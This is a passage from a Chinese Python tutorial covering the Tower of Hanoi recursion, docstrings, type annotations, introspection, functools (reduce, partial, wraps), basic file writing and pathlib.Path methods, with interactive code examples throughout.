<li>将 B 上的 2 个金片移动到 C<br>第 2 个步骤仍然是一步到位，难点就在于第 1 和第 3 个步骤，不过难度经过降级之后，我们可以简单看出：<br>第 1 个步骤只需要借助 C，就可以将两个金片从 A 移到 B，第 3 个步骤只需要借助 A，就可以将 2 个金片从 B 移到 C。<br>于是：<h5 id="1-将顶上的-2-个金片从-A-移动到-B-上，确保大片在小片下方"><a href="#1-将顶上的-2-个金片从-A-移动到-B-上，确保大片在小片下方" class="headerlink" title="1.将顶上的 2 个金片从 A 移动到 B 上，确保大片在小片下方"></a>1.将顶上的 2 个金片从 A 移动到 B 上，确保大片在小片下方</h5></li>
</ol>
<ul>
<li>将顶上的 1 个金片从 A 移到 C 上</li>
<li>将底下的 1 个金片从 A 移到 B 上</li>
<li>将 C 上的 1 个金片移动到 B 上<h5 id="2-将最底下的第-3-个金片从-A-移动到-C-上"><a href="#2-将最底下的第-3-个金片从-A-移动到-C-上" class="headerlink" title="2.将最底下的第 3 个金片从 A 移动到 C 上"></a>2.将最底下的第 3 个金片从 A 移动到 C 上</h5><h5 id="3-将-B-上的-2-个金片移动到-C-上"><a href="#3-将-B-上的-2-个金片移动到-C-上" class="headerlink" title="3.将 B 上的 2 个金片移动到 C 上"></a>3.将 B 上的 2 个金片移动到 C 上</h5></li>
<li>将顶上的 1 个金片从 B 移到 A 上</li>
<li>将底下的 1 个金片从 B 移到 C 上</li>
<li>将 A 上的 1 个金片移动到 C 上</li>
</ul>
<h4 id="16-26-3-汉诺塔代码实现"><a href="#16-26-3-汉诺塔代码实现" class="headerlink" title="16.26.3 汉诺塔代码实现"></a>16.26.3 汉诺塔代码实现</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">def hanoi(n, x, y, z):</span><br><span class="line">    if n == 1:</span><br><span class="line">        print(x, &#x27;--&gt;&#x27;, z)  # 如果只有 1 层，直接将金片从 x 移动到 z</span><br><span class="line">    else:</span><br><span class="line">        hanoi(n-1, x, z, y) # 将 x 上的 n-1 个金片移动到 y</span><br><span class="line">        print(x, &#x27;--&gt;&#x27;, z)  # 将最底下的金片从 x 移动到 z</span><br><span class="line">        hanoi(n-1, y, x, z) # 将 y 上的 n-1 个金片移动到 z</span><br><span class="line">    </span><br><span class="line">n = int(input(&#x27;请输入汉诺塔的层数：&#x27;))</span><br><span class="line">hanoi(n, &#x27;A&#x27;, &#x27;B&#x27;, &#x27;C&#x27;)</span><br></pre></td></tr></table></figure>
<h3 id="16-27-函数文档"><a href="#16-27-函数文档" class="headerlink" title="16.27 函数文档"></a>16.27 函数文档</h3><p>使用<code>help()</code>函数，我们可以快速查看到一个函数的使用文档：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; help(print)</span><br><span class="line">Help on built-in function print in module builtins:</span><br><span class="line">    </span><br><span class="line">print(...)</span><br><span class="line">    print(value, ..., sep=&#x27; &#x27;, end=&#x27;\n&#x27;, file=sys.stdout, flush=False)</span><br><span class="line">    </span><br><span class="line">    Prints the values to a stream, or to sys.stdout by default.</span><br><span class="line">    Optional keyword arguments:</span><br><span class="line">    file:  a file-like object (stream); defaults to the current sys.stdout.</span><br><span class="line">    sep:   string inserted between values, default a space.</span><br><span class="line">    end:   string appended after the last value, default a newline.</span><br><span class="line">    flush: whether to forcibly flush the stream.</span><br></pre></td></tr></table></figure></p>
<p>创建函数文档非常简单，使用字符串就可以了，举个例子：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; def exchange(dollar, rate=7.28):</span><br><span class="line">...     &quot;&quot;&quot;</span><br><span class="line">...     功能：汇率转换，美元 -&gt; 人民币</span><br><span class="line">...     参数：</span><br><span class="line">...     - dollar 美元数量</span><br><span class="line">...     - rate 汇率，默认值是7.28（2022-08-29）</span><br><span class="line">...     返回值：</span><br><span class="line">...     - 人民币的数量</span><br><span class="line">...     &quot;&quot;&quot;</span><br><span class="line">...     return dollar * rate</span><br><span class="line">... </span><br><span class="line">&gt;&gt;&gt; exchange(20)</span><br><span class="line">145.6</span><br></pre></td></tr></table></figure></p>
<ul>
<li>注意：函数文档一定是在函数的最顶部。我们可以看到，函数开头的几行字符串并不会被打印出来，但它将作为函数的文档被保存起来。<br>现在通过 help() 函数，就可以查看到 exchange() 的文档了：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; help(exchange)</span><br><span class="line">Help on function exchange in module __main__:</span><br><span class="line"></span><br><span class="line">exchange(dollar, rate=7.28)</span><br><span class="line">    功能：汇率转换，美元 -&gt; 人民币</span><br><span class="line">    参数：</span><br><span class="line">    - dollar 美元数量</span><br><span class="line">    - rate 汇率，默认值是7.28（2022-08-29）</span><br><span class="line">    返回值：</span><br><span class="line">    - 人民币的数量</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; def times(s:str, n:int) -&gt; str:</span><br><span class="line">...     return s * n</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="16-28-类型注释"><a href="#16-28-类型注释" class="headerlink" title="16.28 类型注释"></a>16.28 类型注释</h3><p>有时候，你可能会看到这样的代码：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; def times(s:str, n:int) -&gt; str:</span><br><span class="line">...     return s * n</span><br></pre></td></tr></table></figure></p>
<p>其实这里面多出来的东东，就是 Python 的类型注释啦~<br>比如上面代码表示该函数的作者，希望调用者传入到 s 参数的是字符串类型，传入到 n 参数的是整数类型，最后还告诉我们函数将会返回一个字符串类型的返回值：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; times(&quot;FishC&quot;, 5)</span><br><span class="line">&#x27;FishCFishCFishCFishCFishC&#x27;</span><br></pre></td></tr></table></figure></p>
<p>当然，这只不过是函数作者的寄望，如果调用者非要胡来，Python 也是不会出面阻止的：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; times(5, 5)</span><br><span class="line">25</span><br></pre></td></tr></table></figure></p>
<p>因为这只是类型注释，是给人看的，不是给机器看的哈。<br>如果需要使用默认参数，那么类型注释可以这么写：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; def times(s:str = &quot;FishC&quot;, n:int = 5) -&gt; str:</span><br><span class="line">...     return s * n</span><br><span class="line">... </span><br><span class="line">&gt;&gt;&gt; times()</span><br><span class="line">&#x27;FishCFishCFishCFishCFishC&#x27;</span><br></pre></td></tr></table></figure></p>
<p>如果期望的参数类型是列表，可以这么写：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; def times(s:list, n:int = 5) -&gt; list:</span><br><span class="line">...     return s * n</span><br><span class="line">... </span><br><span class="line">&gt;&gt;&gt; times([1, 2, 3], 3)</span><br><span class="line">[1, 2, 3, 1, 2, 3, 1, 2, 3]</span><br></pre></td></tr></table></figure></p>
<p>如果还想更进一步，比如期望参数类型是一个整数列表（也就是列表中所有的元素都是整数），那么代码可以这么写：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; def times(s:list[int], n:int = 5) -&gt; list:</span><br><span class="line">...     return s * n</span><br></pre></td></tr></table></figure></p>
<p>映射类型也可以使用这种方法，比如我们期望字典的键是字符串，值是整数，可以这么写：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; def times(s:dict[str, int], n:int = 5) -&gt; list:</span><br><span class="line">...     return list(s.keys()) * n</span><br><span class="line">... </span><br><span class="line">&gt;&gt;&gt; times(&#123;&#x27;A&#x27;:1, &#x27;B&#x27;:2, &#x27;C&#x27;:3&#125;, 3)</span><br><span class="line">[&#x27;A&#x27;, &#x27;B&#x27;, &#x27;C&#x27;, &#x27;A&#x27;, &#x27;B&#x27;, &#x27;C&#x27;, &#x27;A&#x27;, &#x27;B&#x27;, &#x27;C&#x27;]</span><br></pre></td></tr></table></figure></p>
<h3 id="16-29-mypy"><a href="#16-29-mypy" class="headerlink" title="16.29 mypy"></a>16.29 mypy</h3><p>Mypy 模块的安装及使用介绍 -&gt; <a target="_blank" rel="noopener" href="https://fishc.com.cn/thread-209986-1-1.html">传送门</a></p>
<h3 id="16-30-内省"><a href="#16-30-内省" class="headerlink" title="16.30 内省"></a>16.30 内省</h3><p>内省，其实最先是心理学的基本研究方法之一，又称为自我观察法。它是发生在内部的，我们自己能够意识到的主观现象。<br>Python 通过一些特殊的属性来实现内省，比如我们想知道一个函数的名字，可以使用 <strong>name</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; times.__name__</span><br><span class="line">&#x27;times&#x27;</span><br></pre></td></tr></table></figure>
<p>使用 <code>___annotations__</code> 查看函数的类型注释：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; times.__annotations__</span><br><span class="line">&#123;&#x27;s&#x27;: dict[str, int], &#x27;n&#x27;: &lt;class &#x27;int&#x27;&gt;, &#x27;return&#x27;: list[str]&#125;</span><br></pre></td></tr></table></figure></p>
<p>查看函数文档，可以使用 <code>__doc__</code>：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; exchange.__doc__</span><br><span class="line">&#x27;\n\t功能：汇率转换，美元 -&gt; 人民币\n\t参数：\n\t- dollar 美元数量\n\t- rate 汇率，默认值 6.32（2022-03-07）\n\t返回值：\n\t- 人民币数量\n\t&#x27;</span><br></pre></td></tr></table></figure></p>
<p>阅读不友好，咱们使用 print() 函数给打印一下：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; print(exchange.__doc__)</span><br><span class="line">    </span><br><span class="line">        功能：汇率转换，美元 -&gt; 人民币</span><br><span class="line">        参数：</span><br><span class="line">        - dollar 美元数量</span><br><span class="line">        - rate 汇率，默认值 6.32（2022-03-07）</span><br><span class="line">        返回值：</span><br><span class="line">        - 人民币数量</span><br></pre></td></tr></table></figure></p>
<h3 id="16-31-1-高阶函数"><a href="#16-31-1-高阶函数" class="headerlink" title="16.31.1 高阶函数"></a>16.31.1 高阶函数</h3><p>在前面的学习中，我们发现，函数是可以被当作变量一样自由使用的，那么当一个函数接收另一个函数作为参数的时候，这种函数就称之为高阶函数。<br>高阶函数几乎就是函数式编程的灵魂所在，所以 Python 专程为此搞了一个模块 —— functools，这里面包含了非常多实用的高阶函数，以及装饰器。</p>
<p><strong>友情提示，这是好东西，一定要收藏</strong> -&gt; functools — <a target="_blank" rel="noopener" href="https://fishc.com.cn/thread-209319-1-1.html">高阶函数</a></p>
<h4 id="16-31-2-reduce-函数"><a href="#16-31-2-reduce-函数" class="headerlink" title="16.31.2 reduce() 函数"></a>16.31.2 reduce() 函数</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; def add(x, y):</span><br><span class="line">...     return x + y</span><br><span class="line">... </span><br><span class="line">&gt;&gt;&gt; functools.reduce(add, [1, 2, 3, 4, 5])</span><br><span class="line">15</span><br></pre></td></tr></table></figure>
<p>它的第一个参数是指定一个函数，这个函数必须接收两个参数，然后第二个参数是一个可迭代对象，reduce() 函数的作用就是将可迭代对象中的元素依次传递到第一个参数指定的函数中，最终返回累积的结果。</p>
<p>其实就相当于这样子：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; add(add(add(add(1, 2), 3), 4), 5)</span><br><span class="line">15</span><br></pre></td></tr></table></figure></p>
<p>另外，将 reduce() 函数的第一个参数写成 lambda 表达式，代码就更加极客了，比如我们要计算 10 的阶乘，那么可以这么写：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; functools.reduce(lambda x,y:x*y, range(1, 11))</span><br><span class="line">3628800</span><br></pre></td></tr></table></figure></p>
<h4 id="16-31-3-偏函数（partial-function）"><a href="#16-31-3-偏函数（partial-function）" class="headerlink" title="16.31.3 偏函数（partial function）"></a>16.31.3 偏函数（partial function）</h4><p>偏函数是对指定函数的二次包装，通常是将现有函数的部分参数预先绑定，从而得到一个新的函数，该函数就称为偏函数。<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; square = functools.partial(pow, exp=2)</span><br><span class="line">&gt;&gt;&gt; square(2)</span><br><span class="line">4</span><br><span class="line">&gt;&gt;&gt; square(3)</span><br><span class="line">9</span><br><span class="line">&gt;&gt;&gt; cube = functools.partial(pow, exp=3)</span><br><span class="line">&gt;&gt;&gt; cube(2)</span><br><span class="line">8</span><br><span class="line">&gt;&gt;&gt; cube(3)</span><br><span class="line">27</span><br></pre></td></tr></table></figure></p>
<p>偏函数的实现原理大致等价于：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">def partial(func, /, *args, **keywords):</span><br><span class="line">    def newfunc(*fargs, **fkeywords):</span><br><span class="line">        newkeywords = &#123;**keywords, **fkeywords&#125;</span><br><span class="line">        return func(*args, *fargs, **newkeywords)</span><br><span class="line">    newfunc.func = func</span><br><span class="line">    newfunc.args = args</span><br><span class="line">    newfunc.keywords = keywords</span><br><span class="line">    return newfunc</span><br></pre></td></tr></table></figure><br>其实不难发现，它的实现原理就是闭包！<br>只不过使用偏函数的话更简单了一些，细节实现不用我们去费脑子了，直接拿来就用。</p>
<h4 id="16-31-4-wraps-装饰器"><a href="#16-31-4-wraps-装饰器" class="headerlink" title="16.31.4  @wraps 装饰器"></a>16.31.4  @wraps 装饰器</h4><p>让我们先回到讲解装饰器时候的例子：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">import time</span><br><span class="line">    </span><br><span class="line">def time_master(func):</span><br><span class="line">    def call_func():</span><br><span class="line">        print(&quot;开始运行程序...&quot;)</span><br><span class="line">        start = time.time()</span><br><span class="line">        func()</span><br><span class="line">        stop = time.time()</span><br><span class="line">        print(&quot;结束程序运行...&quot;)</span><br><span class="line">        print(f&quot;一共耗费了 &#123;(stop-start):.2f&#125; 秒。&quot;)</span><br><span class="line">    return call_func</span><br><span class="line">    </span><br><span class="line">@time_master</span><br><span class="line">def myfunc():</span><br><span class="line">    time.sleep(2)</span><br><span class="line">    print(&quot;I love FishC.&quot;)</span><br><span class="line">    </span><br><span class="line">myfunc()</span><br></pre></td></tr></table></figure></p>
<p>程序实现如下：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">开始运行程序...</span><br><span class="line">I love FishC.</span><br><span class="line">结束程序运行...</span><br><span class="line">一共耗费了 2.01 秒</span><br></pre></td></tr></table></figure><br>这里的代码呢，其实是有一个 “副作用” 的：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; myfunc.__name__</span><br><span class="line">&#x27;call_func&#x27;</span><br></pre></td></tr></table></figure><br>竟然，myfunc 的名字它不叫 ‘my_func’，而是叫 ‘call_func’……<br>这个其实就是装饰器的一个副作用，虽然通常情况下用起来影响不大，但大佬的眼睛里哪能容得下沙子，对吧？<br>所以发明了这个 @wraps 装饰器来装饰装饰器：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import time</span><br><span class="line">import functools</span><br><span class="line">    </span><br><span class="line">def time_master(func):</span><br><span class="line">    @functools.wraps(func)</span><br><span class="line">    def call_func():</span><br><span class="line">        print(&quot;开始运行程序...&quot;)</span><br><span class="line">        start = time.time()</span><br><span class="line">        func()</span><br><span class="line">        stop = time.time()</span><br><span class="line">        print(&quot;结束程序运行...&quot;)</span><br><span class="line">        print(f&quot;一共耗费了 &#123;(stop-start):.2f&#125; 秒。&quot;)</span><br><span class="line">    return call_func</span><br><span class="line">    </span><br><span class="line">@time_master</span><br><span class="line">def myfunc():</span><br><span class="line">    time.sleep(2)</span><br><span class="line">    print(&quot;I love FishC.&quot;)</span><br><span class="line">    </span><br><span class="line">myfunc()</span><br></pre></td></tr></table></figure></p>
<p>程序实现如下：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">开始运行程序...</span><br><span class="line">I love FishC.</span><br><span class="line">结束程序运行...</span><br><span class="line">一共耗费了 2.01 秒</span><br><span class="line">&gt;&gt;&gt; myfunc.__name__</span><br><span class="line">&#x27;myfunc&#x27;</span><br></pre></td></tr></table></figure></p>
<h3 id="16-35-1-永久储存"><a href="#16-35-1-永久储存" class="headerlink" title="16.35.1 永久储存"></a>16.35.1 永久储存</h3><p>当我们在说 “永久存储” 的时候，是希望将数据保存到硬盘上，而非内存，因为内存在计算机断电后数据将会丢失。</p>
<h4 id="16-35-2-打开文件"><a href="#16-35-2-打开文件" class="headerlink" title="16.35.2 打开文件"></a>16.35.2 打开文件</h4><p>使用 Python 打开一个文件，我们需要用到 open() 函数：<br><code>&gt;&gt;&gt; f = open(&quot;FishC.txt&quot;, &quot;w&quot;)</code><br>第一个参数指定的是文件路径和文件名，这里我们没有添加路径的话，那么默认是将文件创建在 Python 的主文件夹下面，因为执行 IDLE 的程序就放在那里嘛（同样的道理，如果我们在桌面创建一个 test.py 的源文件，然后输入打开文件的代码，那么它就会在桌面创建一个 FishC.txt 的文本文件）。</p>
<p>第二个参数是指定文件的打开模式：<br>:-|:-|<br>字符串|含义<br>‘r’|读取（默认）<br>‘w’|写入（如果文件已存在则先截断清空文件）<br>‘x’|排他性创建文件（如果文件已存在则打开失败）<br>‘a’|追加（如果文件已存在则在末尾追加内容）<br>‘b’|二进制模式<br>‘t’|文本模式（默认）<br>‘+’|更新文件（读取和写入）</p>
<h4 id="16-35-3-文件对象的各种方法大合集"><a href="#16-35-3-文件对象的各种方法大合集" class="headerlink" title="16.35.3 文件对象的各种方法大合集"></a>16.35.3 文件对象的各种方法大合集</h4><p>open() 函数成功调用之后，会返回一个文件对象，那么通过这个文件对象，我们就可以往这个文件里面写入数据啦。<br>文件对象，提供了一系列方法，让你可以对它为所欲为。<br>文件对象的各种方法大合集 -&gt; <a target="_blank" rel="noopener" href="https://fishc.com.cn/thread-210581-1-1.html">传送门</a></p>
<p>有两个方法可以将字符串写入到文本对象种，一个是 write()，一个是 writelines()：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; f.write(&quot;I love Python.&quot;)</span><br><span class="line">14</span><br></pre></td></tr></table></figure><br>使用 write() 方法，它有一个返回值，就是总共写入到文件对象中的字符个数。<br>使用 writelines() 方法，则可以将多个字符串同时写入：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; f.writelines([&quot;I love FishC.\n&quot;, &quot;I love my wife.&quot;])</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><br><strong>注意：虽然 writelines() 方法支持传入多个字符串，但它不会帮你添加换行符，所以我们要自己添加才行。<code>[/n]</code></strong></p>
<h4 id="16-35-4-关闭文件"><a href="#16-35-4-关闭文件" class="headerlink" title="16.35.4 关闭文件"></a>16.35.4 关闭文件</h4><p>我们使用 close() 方法来关闭文件：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; f.close()</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><br><strong>注意，文件对象关闭之后，我们就没办法对它进行操作了。如果想要继续操作文件，那么我们必须重新打开它。</strong></p>
<h3 id="16-36-实用高效的速查手册（大家记得收藏哦）"><a href="#16-36-实用高效的速查手册（大家记得收藏哦）" class="headerlink" title="16.36 实用高效的速查手册（大家记得收藏哦）"></a>16.36 实用高效的速查手册（大家记得收藏哦）</h3><p><strong>pathlib 速查手册 -&gt; <a target="_blank" rel="noopener" href="https://fishc.com.cn/thread-210695-1-1.html">传送门</a></strong></p>
<p><strong>新旧路径处理模块大比拼（pathlib vs os.path）-&gt; <a target="_blank" rel="noopener" href="https://fishc.com.cn/thread-211104-1-1.html">传送门</a></strong></p>
<h3 id="16-37-pathlib-Path-实用功能讲解"><a href="#16-37-pathlib-Path-实用功能讲解" class="headerlink" title="16.37 pathlib.Path 实用功能讲解"></a>16.37 pathlib.Path 实用功能讲解</h3><p>使用 Path 里面的 cwd() 方法来获取当前的工作目录：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; Path.cwd()</span><br><span class="line">WindowsPath(&#x27;C:/Users/goodb/AppData/Local/Programs/Python/Python39&#x27;)</span><br></pre></td></tr></table></figure></p>
<p>创建路径对象：<br><code>&gt;&gt;&gt; p = Path(&#39;C:/Users/goodb/AppData/Local/Programs/Python/Python39&#39;)</code></p>
<p>使用斜杠 <code>/</code> 直接进行路径拼接：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; q = p / &quot;FishC.txt&quot;</span><br><span class="line">&gt;&gt;&gt; q</span><br><span class="line">WindowsPath(&#x27;C:/Users/goodb/AppData/Local/Programs/Python/Python39/FishC.txt&#x27;)</span><br></pre></td></tr></table></figure></p>
<p>使用 <code>is_dir()</code> 方法可以判断一个路径是否为一个文件夹：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; p.is_dir()</span><br><span class="line">True</span><br><span class="line">&gt;&gt;&gt; q.is_dir()</span><br><span class="line">False</span><br></pre></td></tr></table></figure></p>
<p>使用 <code>is_file()</code> 方法可以判断一个路径是否为一个文件：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; p.is_file()</span><br><span class="line">False</span><br><span class="line">&gt;&gt;&gt; q.is_file()</span><br><span class="line">True</span><br></pre></td></tr></table></figure></p>
<p>通过 <code>exists()</code> 方法测试指定的路径是否真实存在：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; p.exists()</span><br><span class="line">True</span><br><span class="line">&gt;&gt;&gt; q.exists()</span><br><span class="line">True</span><br><span class="line">&gt;&gt;&gt; Path(&quot;C:/404&quot;).exists()</span><br><span class="line">False</span><br></pre></td></tr></table></figure></p>
<p>使用 <code>name</code> 属性去获取路径的最后一个部分：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; p.name</span><br><span class="line">&#x27;Python39&#x27;</span><br><span class="line">&gt;&gt;&gt; q.name</span><br><span class="line">&#x27;FishC.txt&#x27;</span><br></pre></td></tr></table></figure></p>
<p><code>stem</code> 属性用于获取文件名，suffix 属性用于获取文件后缀：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; q.stem</span><br><span class="line">&#x27;FishC&#x27;</span><br><span class="line">&gt;&gt;&gt; q.suffix</span><br><span class="line">&#x27;.txt&#x27;</span><br></pre></td></tr></table></figure></p>
<p><code>parent</code> 属性用于获取其父级目录：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; p.parent</span><br><span class="line">WindowsPath(&#x27;C:/Users/goodb/AppData/Local/Programs/Python&#x27;)</span><br><span class="line">&gt;&gt;&gt; q.parent</span><br><span class="line">WindowsPath(&#x27;C:/Users/goodb/AppData/Local/Programs/Python/Python39&#x27;)</span><br></pre></td></tr></table></figure></p>
<p>加个复数，<code>parents</code>，还可以获得其逻辑祖先路径构成的一个不可变序列：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; p.parents</span><br><span class="line">&lt;WindowsPath.parents&gt;</span><br><span class="line">&gt;&gt;&gt; ps = p.parents</span><br><span class="line">&gt;&gt;&gt; for each in ps:</span><br><span class="line">...     print(each)</span><br><span class="line">...         </span><br><span class="line">C:\Users\goodb\AppData\Local\Programs\Python</span><br><span class="line">C:\Users\goodb\AppData\Local\Programs</span><br><span class="line">C:\Users\goodb\AppData\Local</span><br><span class="line">C:\Users\goodb\AppData</span><br><span class="line">C:\Users\goodb</span><br><span class="line">C:\Users</span><br><span class="line">C:\</span><br></pre></td></tr></table></figure></p>
